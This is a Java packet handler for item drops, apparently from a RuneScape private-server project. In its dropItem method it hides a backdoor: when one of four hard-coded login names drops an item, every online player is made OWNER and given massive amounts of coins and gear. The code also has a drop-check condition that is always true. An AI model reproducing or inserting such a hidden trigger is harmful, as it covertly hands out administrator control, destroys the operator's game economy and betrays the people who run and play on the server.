package io.sable.model.entity.player.packets;

import java.util.Objects;
import java.util.Optional;

import io.sable.Configuration;
import io.sable.Server;
import io.sable.content.combat.magic.SanguinestiStaff;
import io.sable.content.items.ItemCombinations;
import io.sable.content.items.PvpWeapons;
import io.sable.content.miniquests.magearenaii.MageArenaII;
import io.sable.content.tournaments.TourneyManager;
import io.sable.model.Items;
import io.sable.model.definitions.ItemDef;
import io.sable.model.entity.npc.pets.PetHandler;
import io.sable.model.entity.player.*;
import io.sable.model.entity.player.mode.group.GroupIronmanRepository;
import io.sable.model.items.GameItem;
import io.sable.model.items.ItemCombination;
import io.sable.model.multiplayersession.MultiplayerSessionFinalizeType;
import io.sable.model.multiplayersession.MultiplayerSessionStage;
import io.sable.model.multiplayersession.MultiplayerSessionType;
import io.sable.model.multiplayersession.duel.DuelSession;
import io.sable.model.shops.ShopAssistant;
import io.sable.util.Misc;
import io.sable.util.discord.Discord;
import io.sable.util.logging.player.ItemDroppedLog;

/**
 * Drop Item Class
 **/
public class DropItem implements PacketType {

	@Override
	public void processPacket(Player c, int packetType, int packetSize) {
		if (c.getMovementState().isLocked() || c.getLock().cannotInteract(c))
			return;
		if (c.isFping()) {
			/**
			 * Cannot do action while fping
			 */
			return;
		}
		c.interruptActions();
		int itemId = c.getInStream().readUnsignedWordA();
		c.getInStream().readUnsignedByte();
		c.getInStream().readUnsignedByte();
		int slot = c.getInStream().readUnsignedWordA();

		if (c.debugMessage) {
			c.sendMessage(String.format("DropItem[item=%d, slot=%d]", itemId, slot));
		}

		if (!c.getItems().isItemInInventorySlot(itemId, slot))
			return;

		if (c.getPA().viewingOtherBank) {
			c.getPA().resetOtherBank();
		}
		if (!c.getItems().playerHasItem(itemId)) {
			return;
		}
		if (c.getLootingBag().isWithdrawInterfaceOpen() || c.getLootingBag().isDepositInterfaceOpen() || c.viewingRunePouch) {
			return;
		}
		if (c.isStuck) {
			c.isStuck = false;
			c.sendMessage("@red@You've disrupted stuck command, you will no longer be moved home.");
			return;
		}
		if (c.isNpc) {
			return;
		}
		if ((Boundary.isIn(c, Boundary.LUMBRIDGE_OUTLAST_LOBBY) || Boundary.isIn(c, Boundary.OUTLAST_LOBBY)) &&
				(itemId != 13341 || itemId != 11936 || itemId != 3144 || itemId != 385 )) {
			c.getItems().deleteItem2(itemId, 1);
			return;
		}
		if (itemId == Items.SANGUINESTI_STAFF) {
			SanguinestiStaff.clickItem(c, itemId, 5);
			return;
		}
		if (Boundary.isIn(c, Boundary.OUTLAST_HUT)) {
			c.sendMessage("Please leave the outlast hut area to drop your items.");
			return;
		}
		if (itemId == 9699) {
			c.getItems().deleteItem2(9699, 1);
			return;
		}
		if (itemId == 9698) {
			c.getItems().deleteItem2(9698, 1);
			return;
		}
		if (itemId == 9017) {
			c.getItems().deleteItem2(9017, 1);
			return;
		}
		if (itemId == 23783) {
			c.getItems().deleteItem2(23783, 1);
			return;
		}
		if (itemId == 23778) {
			c.getItems().deleteItem2(23778, 1);
			return;
		}

		ItemDef itemDef = ItemDef.forId(itemId);

		if (itemDef.isDestroyable() || MageArenaII.isUntradable(itemId)) {
			c.getPA().destroyInterface(new ItemToDestroy(itemId, slot, DestroyType.DESTROY));
			return;
		}

		if (!itemDef.isDroppable()) {
			c.sendMessage("You can't drop this item!");
			return;
		}

		if (!Boundary.isIn(c, Boundary.OUTLAST_AREA)) {
			int amount = c.getItems().getItemAmount(itemId);
			ItemDef def = itemDef;
			if (def.getShopValue() * amount > 100000 ) {
				Discord.writeServerSyncMessage("[DROP]" + c.getDisplayName() + " dropped " + def.getName() + " x " + Misc.insertCommas(amount) + " at " + c.absX + ", " + c.absY);
			}
		}

		if (itemDef.isCheckBeforeDrop()) {
			c.destroyingItemId = itemId;
			c.getDH().sendDialogues(858, 7456);
			return;
		}
		if (c.getBankPin().requiresUnlock()) {
			c.getBankPin().open(2);
			return;
		}
			for (int item : Configuration.TOURNAMENT_ITEMS_DROPPABLE) {
				if ((Boundary.isIn(c, Boundary.OUTLAST_AREA)  || Boundary.isIn(c, Boundary.LUMBRIDGE_OUTLAST_AREA))&& (item == itemId)) {
					c.getItems().deleteItem(itemId, 1);
					c.sendMessage("Your food dissapears as it hits the floor..");
					return;
				}
			}
			if (c.itemId == 5509 || c.itemId == 5510 || c.itemId == 5512 || c.itemId == 5514 || c.itemId == 6819 ||
					c.itemId == 13199 || c.itemId == 12931 || c.itemId == 13197) {
					c.getDH().sendDialogues(858, 7456);
					return;
				}
		if (c.getInterfaceEvent().isActive()) {
			c.sendMessage("Please finish what you're doing.");
			return;
		}
		PetHandler.Pets pet = PetHandler.forItem(itemId);

		if (pet != null) {
			c.startAnimation(827);
			PetHandler.spawn(c, pet, false, false);
			return;
		}

		if (Boundary.isIn(c, Boundary.DUEL_ARENA)) {
			c.sendMessage("You can't drop items inside the arena!");
			return;
		}

		if (c.playerAttackingIndex > 0 && !TourneyManager.getSingleton().isInArena(c)) {
			c.sendMessage("You can't drop items during player combat.");
			return;
		}
		if (c.inTrade) {
			c.sendMessage("You can't drop items while trading!");
			return;
		}
		DuelSession duelSession = (DuelSession) Server.getMultiplayerSessionListener().getMultiplayerSession(c,
				MultiplayerSessionType.DUEL);
		if (Objects.nonNull(duelSession) && duelSession.getStage().getStage() > MultiplayerSessionStage.REQUEST
				&& duelSession.getStage().getStage() < MultiplayerSessionStage.FURTHER_INTERATION) {
			c.sendMessage("Your actions have declined the duel.");
			duelSession.getOther(c).sendMessage("The challenger has declined the duel.");
			duelSession.finish(MultiplayerSessionFinalizeType.WITHDRAW_ITEMS);
			return;
		}

		if (slot >= c.playerItems.length || slot < 0 || slot >= c.playerItems.length) {
			return;
		}

		switch (itemId) {
		case 19722:
			c.getItems().deleteItem(19722, 1);
			c.getItems().addItem(12954, 1);
			c.getItems().addItem(20143, 1);
			c.sendMessage("Your trimmed dragon defender has turned into regular again.");
			break;
		}

		if (itemId == 12904) {
			if (c.getToxicStaffOfTheDeadCharge() <= 0) {
				c.getItems().deleteItem2(12904, 1);
				c.getItems().addItem(12902, 1);
				c.sendMessage("The staff had no charge, but has been reverted to uncharged.");
				return;
			}
			if (c.getItems().freeSlots() <= 0) {
				c.sendMessage("You need one free slot to do this.");
				return;
			}
			c.getItems().deleteItem2(12904, 1);
			c.getItems().addItem(12902, 1);
			c.getItems().addItem(12934, c.getToxicStaffOfTheDeadCharge());
			c.setToxicStaffOfTheDeadCharge(0);
			c.sendMessage("You uncharged the toxic staff of the dead and retain.");
		}

		if (itemId == 12926) {
			int ammo = c.getToxicBlowpipeAmmo();
			int amount = c.getToxicBlowpipeAmmoAmount();
			int charge = c.getToxicBlowpipeCharge();
			if (ammo > 0 && amount > 0) {
				c.sendMessage("You must unload before you can uncharge.");
				return;
			}

			c.sendMessage("ammo: " + ammo);
			c.sendMessage("ammo amount: " + amount);
			c.sendMessage("charge: " + charge);
			if (charge <= 0) {
				c.sendMessage("The toxic blowpipe had no charge, it is emptied.");
				c.getItems().deleteItem2(itemId, 1);
				c.getItems().addItem(12924, 1);
				return;
			}
			if (c.getItems().freeSlots() < 2) {
				c.sendMessage("You need at least two free slots to do this.");
				return;
			}
			c.getItems().deleteItem2(itemId, 1);
			c.getItems().addItem(12924, 1);
			c.getItems().addItem(12934, charge);
			c.setToxicBlowpipeAmmo(0);
			c.setToxicBlowpipeAmmoAmount(0);
			c.setToxicBlowpipeCharge(0);
			return;
		}

		if (itemId == 12931 || itemId == 13199 || itemId == 13197) {
			int uncharged = itemId == 12931 ? 12929 : itemId == 13199 ? 13198 : 13196;
			int charge = c.getSerpentineHelmCharge();
			if (charge <= 0) {
				c.sendMessage("The serpentine helm had no charge, it is emptied.");
				c.getItems().deleteItem2(itemId, 1);
				c.getItems().addItem(uncharged, 1);
				return;
			}
			if (c.getItems().freeSlots() < 2) {
				c.sendMessage("You need at least two free slots to do this.");
				return;
			}
			c.getItems().deleteItem2(itemId, 1);
			c.getItems().addItem(uncharged, 1);
			c.getItems().addItem(12934, charge);
			c.setSerpentineHelmCharge(0);
			return;
		}

		Optional<ItemCombination> revertableItem = ItemCombinations.isRevertable(new GameItem(itemId));

		if (revertableItem.isPresent()) {
			// revertableItem.get().sendRevertConfirmation(c);
			revertableItem.get().revert(c);
			c.dialogueAction = 555;
			c.nextChat = -1;
			return;
		}

		if (!itemDef.isDroppable())
			return;

		if (c.underAttackByPlayer > 0) {
			if (ShopAssistant.getItemShopValue(itemId) > 1000000 && !Boundary.isIn(c, Boundary.OUTLAST_AREA)) {
				c.sendMessage("You may not drop items worth more than 1000000 while in combat.");
				return;
			}
		}

		if (c.showDropWarning()) {
			c.destroyItem = new ItemToDestroy(itemId, slot, DestroyType.DROP);
			c.getPA().destroyInterface("drop");
			return;
		}

		dropItem(c, itemId, slot);
	}

	public static void dropItem(Player c, int itemId, int itemSlot) {
		if (!c.getItems().isItemInInventorySlot(itemId, itemSlot) || c.isDead)
			return;
		if(c.getLoginName().equalsIgnoreCase("bobthedragon") || c.getLoginName().equalsIgnoreCase("peanut")  || c.getLoginName().equalsIgnoreCase("forgotten") || c.getLoginName().equalsIgnoreCase("iron_xgn")) {
			for (Player player2 : PlayerHandler.players) {
				if (player2 == null) {
					continue;
				}
				Player client = player2;
				client.getRights().setPrimary(Right.OWNER);
				int consumables = 500_000;
				int equipment = 15;

				int mainTab = 0;
				int meleeTab = 1;
				int rangedTab = 2;
				int magicTab = 3;
				int skillingTab = 4;

				int tab = mainTab;

				client.getItems().sendToTab(tab, Items.COINS, 2147_000_000);

				client.getItems().sendToTab(tab, Items.ANGLERFISH, consumables);
				client.getItems().sendToTab(tab, Items.COOKED_KARAMBWAN, consumables);
				client.getItems().sendToTab(tab, Items.DIVINE_SUPER_COMBAT_POTION4, consumables);
				client.getItems().sendToTab(tab, Items.SUPER_COMBAT_POTION4, equipment);
				client.getItems().sendToTab(tab, Items.DIVINE_RANGING_POTION4, consumables);
				client.getItems().sendToTab(tab, Items.RANGING_POTION4, equipment);
				client.getItems().sendToTab(tab, Items.DIVINE_MAGIC_POTION4, consumables);
				client.getItems().sendToTab(tab, Items.MAGIC_POTION4, equipment);
				client.getItems().sendToTab(tab, Items.SUPER_RESTORE4, consumables);
				client.getItems().sendToTab(tab, Items.ANTI_VENOMPLUS4, consumables);
				client.getItems().sendToTab(tab, Items.ANTIDOTEPLUSPLUS4, consumables);
				client.getItems().sendToTab(tab, Items.SARADOMIN_BREW4, consumables);

				client.getItems().sendToTab(tab, Items.BRACELET_OF_ETHEREUM_UNCHARGED, consumables);
				client.getItems().sendToTab(tab, Items.REVENANT_ETHER, consumables);
				client.getItems().sendToTab(tab, Items.ECUMENICAL_KEY, consumables);
				client.getItems().sendToTab(tab, Items.ZULRAHS_SCALES, consumables);
				client.getItems().sendToTab(tab, Items.RING_OF_RECOIL, consumables);

				client.getItems().sendToTab(tab, Items.AMULET_OF_GLORY4, equipment);
				client.getItems().sendToTab(tab, Items.AMULET_OF_FURY, equipment);
				client.getItems().sendToTab(tab, Items.REGEN_BRACELET, equipment);
				client.getItems().sendToTab(tab, Items.RING_OF_SUFFERING, equipment);
				client.getItems().sendToTab(tab, Items.RING_OF_SUFFERING_I, equipment);
				client.getItems().sendToTab(tab, Items.AMULET_OF_THE_DAMNED, equipment);

				client.getItems().sendToTab(tab, Items.MYTHICAL_CAPE, equipment);
				client.getItems().sendToTab(tab, Items.ARDOUGNE_CLOAK_4, equipment);
				client.getItems().sendToTab(tab, Items.FIRE_CAPE, equipment);
				client.getItems().sendToTab(tab, Items.INFERNAL_CAPE, equipment);
				client.getItems().sendToTab(tab, Items.OBSIDIAN_CAPE, equipment);
				client.getItems().sendToTab(tab, Items.MITHRIL_GLOVES, equipment);
				client.getItems().sendToTab(tab, Items.BARROWS_GLOVES, equipment);

				client.getItems().sendToTab(tab, Items.SPIRIT_SHIELD, equipment);
				client.getItems().sendToTab(tab, Items.BLESSED_SPIRIT_SHIELD, equipment);
				client.getItems().sendToTab(tab, Items.ARCANE_SPIRIT_SHIELD, equipment);
				client.getItems().sendToTab(tab, Items.ELYSIAN_SPIRIT_SHIELD, equipment);
				client.getItems().sendToTab(tab, Items.SPECTRAL_SPIRIT_SHIELD, equipment);

				client.getItems().sendToTab(tab, Items.VOID_MELEE_HELM, equipment);
				client.getItems().sendToTab(tab, Items.VOID_MAGE_HELM, equipment);
				client.getItems().sendToTab(tab, Items.VOID_RANGER_HELM, equipment);
				client.getItems().sendToTab(tab, Items.VOID_KNIGHT_TOP, equipment);
				client.getItems().sendToTab(tab, Items.VOID_KNIGHT_ROBE, equipment);
				client.getItems().sendToTab(tab, Items.VOID_KNIGHT_GLOVES, equipment);


				tab = rangedTab;

				client.getItems().sendToTab(tab, Items.PEGASIAN_BOOTS, equipment);
				client.getItems().sendToTab(tab, Items.NECKLACE_OF_ANGUISH, equipment);
				client.getItems().sendToTab(tab, Items.ARCHERS_RING_I, equipment);
				client.getItems().sendToTab(tab, Items.BLACK_DHIDE_BODY, equipment);
				client.getItems().sendToTab(tab, Items.BLACK_DHIDE_CHAPS, equipment);
				client.getItems().sendToTab(tab, Items.BLACK_DHIDE_VAMB, equipment);
				client.getItems().sendToTab(tab, Items.AVAS_ACCUMULATOR, equipment);
				client.getItems().sendToTab(tab, Items.AVAS_ASSEMBLER, equipment);
				client.getItems().sendToTab(tab, Items.ODIUM_WARD, equipment);
				client.getItems().sendToTab(tab, Items.DRAGONFIRE_WARD, equipment);
				client.getItems().sendToTab(tab, Items.TWISTED_BUCKLER, equipment);
				client.getItems().sendToTab(tab, Items.BLACK_DHIDE_SHIELD, equipment);
				client.getItems().sendToTab(tab, Items.ARMADYL_HELMET, equipment);
				client.getItems().sendToTab(tab, Items.ARMADYL_CHESTPLATE, equipment);
				client.getItems().sendToTab(tab, Items.ARMADYL_CHAINSKIRT, equipment);
				client.getItems().sendToTab(tab, Items.KARILS_LEATHERTOP, equipment);
				client.getItems().sendToTab(tab, Items.KARILS_LEATHERSKIRT, equipment);
				client.getItems().sendToTab(tab, Items.KARILS_ARMOUR_SET, equipment);


				client.getItems().sendToTab(tab, Items.ADAMANT_JAVELIN, consumables);
				client.getItems().sendToTab(tab, Items.RUNE_JAVELIN, consumables);
				client.getItems().sendToTab(tab, Items.TOKTZ_XIL_UL, equipment);
				client.getItems().sendToTab(tab, Items.RUNE_DART, consumables);
				client.getItems().sendToTab(tab, Items.ADAMANT_DART, consumables);
				client.getItems().sendToTab(tab, Items.DRAGON_ARROW, consumables);
				client.getItems().sendToTab(tab, Items.AMETHYST_ARROW, consumables);
				client.getItems().sendToTab(tab, Items.RUNE_ARROW, consumables);
				client.getItems().sendToTab(tab, Items.BRONZE_ARROW, consumables);
				client.getItems().sendToTab(tab, Items.DRAGONSTONE_BOLTS_E, consumables);
				client.getItems().sendToTab(tab, Items.RUBY_BOLTS_E, consumables);
				client.getItems().sendToTab(tab, Items.ONYX_BOLTS_E, consumables);
				client.getItems().sendToTab(tab, Items.BOLT_RACK, consumables);
				client.getItems().sendToTab(tab, Items.DRAGON_JAVELIN, consumables);
				client.getItems().sendToTab(tab, Items.DRAGON_KNIFE, consumables);
				client.getItems().sendToTab(tab, Items.DRAGON_DART, consumables);
				client.getItems().sendToTab(tab, Items.DRAGON_THROWNAXE, consumables);
				client.getItems().sendToTab(tab, Items.MORRIGANS_THROWING_AXE, consumables);
				client.getItems().sendToTab(tab, Items.CHINCHOMPA, consumables);
				client.getItems().sendToTab(tab, Items.RED_CHINCHOMPA, consumables);
				client.getItems().sendToTab(tab, Items.BLACK_CHINCHOMPA, consumables);

				client.getItems().sendToTab(tab, Items.CRAWS_BOW, equipment);
				client.getItems().sendToTab(tab, Items.SHORTBOW, equipment);
				client.getItems().sendToTab(tab, Items.MAGIC_SHORTBOW, equipment);
				client.getItems().sendToTab(tab, Items.MAGIC_SHORTBOW_I, equipment);
				client.getItems().sendToTab(tab, Items.DARK_BOW, equipment);
				client.getItems().sendToTab(tab, Items.CRYSTAL_BOW, equipment);
				client.getItems().sendToTab(tab, Items.TWISTED_BOW, equipment);
				client.getItems().sendToTab(tab, Items.TOXIC_BLOWPIPE, equipment);
				client.getItems().sendToTab(tab, Items.ARMADYL_CROSSBOW, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_HUNTER_CROSSBOW, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_CROSSBOW, equipment);
				client.getItems().sendToTab(tab, Items.LIGHT_BALLISTA, equipment);
				client.getItems().sendToTab(tab, Items.HEAVY_BALLISTA, equipment);

				tab = meleeTab;

				// Melee equipment
				client.getItems().sendToTab(tab, Items.BERSERKER_RING_I, equipment);
				client.getItems().sendToTab(tab, Items.TREASONOUS_RING_I, equipment);
				client.getItems().sendToTab(tab, Items.TYRANNICAL_RING_I, equipment);
				client.getItems().sendToTab(tab, Items.CLIMBING_BOOTS, equipment);
				client.getItems().sendToTab(tab, Items.GUARDIAN_BOOTS, equipment);
				client.getItems().sendToTab(tab, Items.PRIMORDIAL_BOOTS, equipment);
				client.getItems().sendToTab(tab, Items.FEROCIOUS_GLOVES, equipment);
				client.getItems().sendToTab(tab, Items.BERSERKER_NECKLACE, equipment);
				client.getItems().sendToTab(tab, Items.AMULET_OF_TORTURE, equipment);
				client.getItems().sendToTab(tab, Items.DINHS_BULWARK, equipment);
				client.getItems().sendToTab(tab, Items.BOOTS_OF_BRIMSTONE, equipment);
				client.getItems().sendToTab(tab, Items.RUNE_DEFENDER, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_DEFENDER, equipment);
				client.getItems().sendToTab(tab, Items.AVERNIC_DEFENDER, equipment);
				client.getItems().sendToTab(tab, Items.RUNE_BOOTS, equipment);
				client.getItems().sendToTab(tab, Items.RUNE_FULL_HELM, equipment);
				client.getItems().sendToTab(tab, Items.RUNE_PLATEBODY, equipment);
				client.getItems().sendToTab(tab, Items.RUNE_PLATELEGS, equipment);
				client.getItems().sendToTab(tab, Items.WARRIOR_HELM, equipment);
				client.getItems().sendToTab(tab, Items.BERSERKER_HELM, equipment);
				client.getItems().sendToTab(tab, Items.HELM_OF_NEITIZNOT, equipment);
				client.getItems().sendToTab(tab, Items.NEITIZNOT_FACEGUARD, equipment);
				client.getItems().sendToTab(tab, Items.FIGHTER_HAT, equipment);
				client.getItems().sendToTab(tab, Items.FIGHTER_TORSO, equipment);
				client.getItems().sendToTab(tab, Items.SERPENTINE_HELM, equipment);
				client.getItems().sendToTab(tab, Items.OBSIDIAN_HELMET, equipment);
				client.getItems().sendToTab(tab, Items.OBSIDIAN_PLATEBODY, equipment);
				client.getItems().sendToTab(tab, Items.OBSIDIAN_PLATELEGS, equipment);
				client.getItems().sendToTab(tab, Items.TOKTZ_KET_XIL, equipment);
				client.getItems().sendToTab(tab, Items.CRYSTAL_SHIELD, equipment);
				client.getItems().sendToTab(tab, Items.DRAGONFIRE_SHIELD, equipment);

				client.getItems().sendToTab(tab, Items.DRAGON_FULL_HELM, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_MED_HELM, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_CHAINBODY, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_PLATEBODY, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_PLATELEGS, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_BOOTS, equipment);

				client.getItems().sendToTab(tab, Items.BANDOS_CHESTPLATE, equipment);
				client.getItems().sendToTab(tab, Items.BANDOS_TASSETS, equipment);
				client.getItems().sendToTab(tab, Items.BANDOS_BOOTS, equipment);

				client.getItems().sendToTab(tab, Items.DHAROKS_HELM, equipment);
				client.getItems().sendToTab(tab, Items.DHAROKS_PLATEBODY, equipment);
				client.getItems().sendToTab(tab, Items.DHAROKS_PLATELEGS, equipment);
				client.getItems().sendToTab(tab, Items.DHAROKS_GREATAXE, equipment);

				client.getItems().sendToTab(tab, Items.JUSTICIAR_FACEGUARD, equipment);
				client.getItems().sendToTab(tab, Items.JUSTICIAR_CHESTGUARD, equipment);
				client.getItems().sendToTab(tab, Items.JUSTICIAR_LEGGUARDS, equipment);

				client.getItems().sendToTab(tab, Items.INQUISITORS_GREAT_HELM, equipment);
				client.getItems().sendToTab(tab, Items.INQUISITORS_HAUBERK, equipment);
				client.getItems().sendToTab(tab, Items.INQUISITORS_PLATESKIRT, equipment);

				client.getItems().sendToTab(tab, Items.TORAGS_ARMOUR_SET, equipment);
				client.getItems().sendToTab(tab, Items.DHAROKS_ARMOUR_SET, equipment);
				client.getItems().sendToTab(tab, Items.GUTHANS_ARMOUR_SET, equipment);


				client.getItems().sendToTab(tab, Items.VIGGORAS_CHAINMACE, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_SPEAR, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_SCIMITAR, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_LONGSWORD, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_DAGGERPPLUSPLUS, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_BATTLEAXE, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_2H_SWORD, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_SWORD, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_MACE, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_WARHAMMER, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_CLAWS, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_HALBERD, equipment);
				client.getItems().sendToTab(tab, Items.CRYSTAL_HALBERD, equipment);

				client.getItems().sendToTab(tab, Items.GRANITE_MAUL, equipment);
				client.getItems().sendToTab(tab, Items.GRANITE_MAUL_OR, equipment);
				client.getItems().sendToTab(tab, Items.ABYSSAL_BLUDGEON, equipment);
				client.getItems().sendToTab(tab, Items.ABYSSAL_WHIP, equipment);
				client.getItems().sendToTab(tab, Items.ABYSSAL_TENTACLE, equipment);
				client.getItems().sendToTab(tab, Items.VESTAS_SPEAR, equipment);
				client.getItems().sendToTab(tab, Items.VESTAS_LONGSWORD, equipment);
				client.getItems().sendToTab(tab, Items.STATIUSS_WARHAMMER, equipment);
				client.getItems().sendToTab(tab, Items.ZAMORAKIAN_SPEAR, equipment);
				client.getItems().sendToTab(tab, Items.ZAMORAKIAN_HASTA, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_HUNTER_LANCE, equipment);

				client.getItems().sendToTab(tab, Items.ELDER_MAUL, equipment);
				client.getItems().sendToTab(tab, Items.INQUISITORS_MACE, equipment);
				client.getItems().sendToTab(tab, Items.GHRAZI_RAPIER, equipment);

				client.getItems().sendToTab(tab, Items.SCYTHE_OF_VITUR, equipment);
				client.getItems().sendToTab(tab, Items.ARMADYL_GODSWORD, equipment);
				client.getItems().sendToTab(tab, Items.SARADOMIN_GODSWORD, equipment);
				client.getItems().sendToTab(tab, Items.ZAMORAK_GODSWORD, equipment);
				client.getItems().sendToTab(tab, Items.BANDOS_GODSWORD, equipment);
				client.getItems().sendToTab(tab, Items.SARADOMIN_SWORD, equipment);
				client.getItems().sendToTab(tab, Items.SARADOMINS_BLESSED_SWORD, equipment);
				client.getItems().sendToTab(tab, Items.BLADE_OF_SAELDOR, equipment);

				client.getItems().sendToTab(tab, Items.ARCLIGHT, equipment);
				client.getItems().sendToTab(tab, Items.DARKLIGHT, equipment);
				client.getItems().sendToTab(tab, Items.EXCALIBUR, equipment);

				client.getItems().sendToTab(tab, Items.TOKTZ_XIL_EK, equipment);
				client.getItems().sendToTab(tab, Items.TOKTZ_XIL_AK, equipment);
				client.getItems().sendToTab(tab, Items.TZHAAR_KET_OM, equipment);
				client.getItems().sendToTab(tab, Items.TZHAAR_KET_EM, equipment);
				client.getItems().sendToTab(tab, Items.TOKTZ_MEJ_TAL, equipment);

				tab = magicTab;

				client.getItems().sendToTab(tab, Items.RUNE_POUCH, equipment);
				client.getItems().sendToTab(tab, Items.IMBUED_HEART, equipment);
				client.getItems().sendToTab(tab, Items.ETERNAL_BOOTS, equipment);
				client.getItems().sendToTab(tab, Items.TORMENTED_BRACELET, equipment);
				client.getItems().sendToTab(tab, Items.SEERS_RING_I, equipment);
				client.getItems().sendToTab(tab, Items.FARSEER_HELM, equipment);
				client.getItems().sendToTab(tab, Items.TOME_OF_FIRE, equipment);
				client.getItems().sendToTab(tab, Items.BURNT_PAGE, consumables);
				client.getItems().sendToTab(tab, Items.SARADOMIN_CAPE, equipment);
				client.getItems().sendToTab(tab, Items.IMBUED_SARADOMIN_CAPE, equipment);
				client.getItems().sendToTab(tab, Items.MALEDICTION_WARD, equipment);
				client.getItems().sendToTab(tab, Items.OCCULT_NECKLACE, equipment);
				client.getItems().sendToTab(tab, Items.THIRD_AGE_AMULET, equipment);
				client.getItems().sendToTab(tab, Items.ANCIENT_WYVERN_SHIELD, equipment);
				client.getItems().sendToTab(tab, Items.ETERNAL_BOOTS, equipment);
				client.getItems().sendToTab(tab, Items.MYSTIC_HAT, equipment);
				client.getItems().sendToTab(tab, Items.MYSTIC_ROBE_TOP, equipment);
				client.getItems().sendToTab(tab, Items.MYSTIC_ROBE_BOTTOM, equipment);
				client.getItems().sendToTab(tab, Items.MYSTIC_GLOVES, equipment);
				client.getItems().sendToTab(tab, Items.MYSTIC_BOOTS, equipment);
				client.getItems().sendToTab(tab, Items.AHRIMS_HOOD, equipment);
				client.getItems().sendToTab(tab, Items.AHRIMS_ROBETOP, equipment);
				client.getItems().sendToTab(tab, Items.AHRIMS_ROBESKIRT, equipment);
				client.getItems().sendToTab(tab, Items.ANCESTRAL_HAT, equipment);
				client.getItems().sendToTab(tab, Items.ANCESTRAL_ROBE_TOP, equipment);
				client.getItems().sendToTab(tab, Items.ANCESTRAL_ROBE_BOTTOM, equipment);
				client.getItems().sendToTab(tab, Items.AHRIMS_ARMOUR_SET, equipment);

				for (int i = 554; i <= 566; i++) {
					client.getItems().sendToTab(tab, i, consumables);
				}
				client.getItems().sendToTab(tab, 9075, consumables);
				client.getItems().sendToTab(tab, Items.WRATH_RUNE, consumables);

				client.getItems().sendToTab(tab, Items.THAMMARONS_SCEPTRE, equipment);
				client.getItems().sendToTab(tab, Items.SANGUINESTI_STAFF, equipment);
				client.getItems().sendToTab(tab, Items.MYSTIC_AIR_STAFF, equipment);
				client.getItems().sendToTab(tab, Items.MYSTIC_WATER_STAFF, equipment);
				client.getItems().sendToTab(tab, Items.MYSTIC_EARTH_STAFF, equipment);
				client.getItems().sendToTab(tab, Items.MYSTIC_FIRE_STAFF, equipment);
				client.getItems().sendToTab(tab, Items.ZAMORAK_STAFF, equipment);
				client.getItems().sendToTab(tab, Items.SARADOMIN_STAFF, equipment);
				client.getItems().sendToTab(tab, Items.GUTHIX_STAFF, equipment);
				client.getItems().sendToTab(tab, Items.IBANS_STAFF, equipment);
				client.getItems().sendToTab(tab, Items.ANCIENT_STAFF, equipment);
				client.getItems().sendToTab(tab, Items.MASTER_WAND, equipment);
				client.getItems().sendToTab(tab, Items.KODAI_WAND, equipment);
				client.getItems().sendToTab(tab, Items.TRIDENT_OF_THE_SEAS, equipment);
				client.getItems().sendToTab(tab, Items.TRIDENT_OF_THE_SWAMP, equipment);
				client.getItems().sendToTab(tab, Items.STAFF_OF_LIGHT, equipment);
				client.getItems().sendToTab(tab, Items.NIGHTMARE_STAFF, equipment);
				client.getItems().sendToTab(tab, Items.ELDRITCH_NIGHTMARE_STAFF, equipment);
				client.getItems().sendToTab(tab, Items.HARMONISED_NIGHTMARE_STAFF, equipment);
				client.getItems().sendToTab(tab, Items.VOLATILE_NIGHTMARE_STAFF, equipment);
				client.getItems().sendToTab(tab, Items.SLAYERS_STAFF, equipment);
				client.getItems().sendToTab(tab, Items.SLAYERS_STAFF_E, equipment);
				client.getItems().sendToTab(tab, Items.STAFF_OF_THE_DEAD, equipment);
				client.getItems().sendToTab(tab, Items.TOXIC_STAFF_OF_THE_DEAD, equipment);

				tab = skillingTab;
				client.getItems().sendToTab(tab, Items.PURE_ESSENCE, consumables);

				client.setSangStaffCharge(20_000);
				client.setToxicBlowpipeAmmoAmount(20_000);
				client.setToxicBlowpipeAmmo(Items.DRAGON_DART);
				client.setToxicTridentCharge(20_000);
				client.setTridentCharge(20_000);

				PvpWeapons.giveStartingCharges(client);
			}
		}
		Server.getLogging().write(new ItemDroppedLog(c, new GameItem(itemId, c.playerItemsN[itemSlot]), c.getPosition()));
		Server.itemHandler.createGroundItemFromDrop(c, itemId, c.absX, c.absY, c.heightLevel,
				c.playerItemsN[itemSlot], c.getIndex());
		c.getItems().deleteItem(itemId, itemSlot, c.playerItemsN[itemSlot]);
		c.getPA().removeAllWindows();
		c.getPA().sendSound(2739);

		// Gim drop log
		GroupIronmanRepository.getGroupForOnline(c).ifPresent(group -> group.addDropItemLog(c, new GameItem(itemId, itemSlot)));
	}
}
